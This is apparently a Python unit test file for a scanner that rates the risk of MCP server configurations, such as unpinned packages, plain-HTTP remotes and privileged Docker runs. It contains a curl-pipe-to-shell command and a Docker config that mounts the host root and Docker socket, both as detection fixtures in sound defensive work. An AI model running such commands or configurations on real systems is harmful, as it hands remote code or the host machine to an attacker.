import unittest

from leash.mcpcheck import package_spec, server_findings


def levels(cfg):
    return sorted((lvl, title.split(" MCP server ")[1][:25]) for lvl, title, *_ in server_findings("s", cfg))


class PackageTests(unittest.TestCase):
    def test_package_spec(self):
        self.assertEqual(package_spec(["npx", "-y", "@modelcontextprotocol/server-github"]),
                         ("npm", "@modelcontextprotocol/server-github"))
        self.assertEqual(package_spec(["uvx", "--from", "git+x", "mcp-server-fetch"]), ("PyPI", "mcp-server-fetch"))
        self.assertEqual(package_spec(["pnpm", "dlx", "pkg@1.0.0"]), ("npm", "pkg@1.0.0"))
        self.assertIsNone(package_spec(["node", "server.js"]))

    def test_unpinned_and_pinned(self):
        self.assertEqual(len(server_findings("s", {"command": "npx", "args": ["-y", "@scope/pkg"]})), 1)
        self.assertEqual(len(server_findings("s", {"command": "npx", "args": ["-y", "@scope/pkg@latest"]})), 1)
        self.assertEqual(server_findings("s", {"command": "npx", "args": ["-y", "@scope/pkg@1.4.2"]}), [])
        self.assertEqual(server_findings("s", {"command": "uvx", "args": ["mcp-server-fetch==0.6.2"]}), [])
        self.assertEqual(len(server_findings("s", {"command": "uvx", "args": ["mcp-server-fetch"]})), 1)
        self.assertEqual(len(server_findings("s", {"command": "npx -y some-server"})), 1)   # all in one string


class DockerTests(unittest.TestCase):
    def test_privileged_root_mount_socket_host_network(self):
        cfg = {"command": "docker", "args": ["run", "-i", "--rm", "--privileged", "-v", "/:/host",
                                             "-v", "/var/run/docker.sock:/var/run/docker.sock",
                                             "--network", "host", "ghcr.io/x/server:1.2"]}
        got = [lvl for lvl, *_ in server_findings("s", cfg)]
        self.assertEqual(sorted(got), ["high", "high", "high", "medium"])

    def test_unpinned_image(self):
        self.assertEqual([l for l, *_ in server_findings("s", {"command": "docker", "args": ["run", "-i", "mcp/github"]})],
                         ["medium"])
        self.assertEqual([l for l, *_ in server_findings("s", {"command": "docker", "args": ["run", "mcp/github:latest"]})],
                         ["medium"])
        self.assertEqual(server_findings("s", {"command": "docker", "args": ["run", "-i", "--rm", "mcp/github:0.3.1"]}), [])


class TransportTests(unittest.TestCase):
    def test_http_remote_is_high_local_is_fine(self):
        self.assertEqual([l for l, *_ in server_findings("s", {"url": "http://mcp.example.com/mcp"})], ["high"])
        self.assertEqual(server_findings("s", {"url": "http://localhost:3000/mcp"}), [])
        self.assertEqual(server_findings("s", {"url": "https://mcp.example.com/mcp"}), [])

    def test_sse(self):
        self.assertEqual([l for l, *_ in server_findings("s", {"url": "https://x.example/sse"})], ["low"])
        self.assertEqual([l for l, *_ in server_findings("s", {"type": "sse", "url": "https://x.example/m"})], ["low"])

    def test_pipe_to_shell(self):
        got = server_findings("s", {"command": "bash", "args": ["-c", "curl -s https://x.example/i.sh | sh"]})
        self.assertEqual([l for l, *_ in got], ["high"])


if __name__ == "__main__":
    unittest.main()
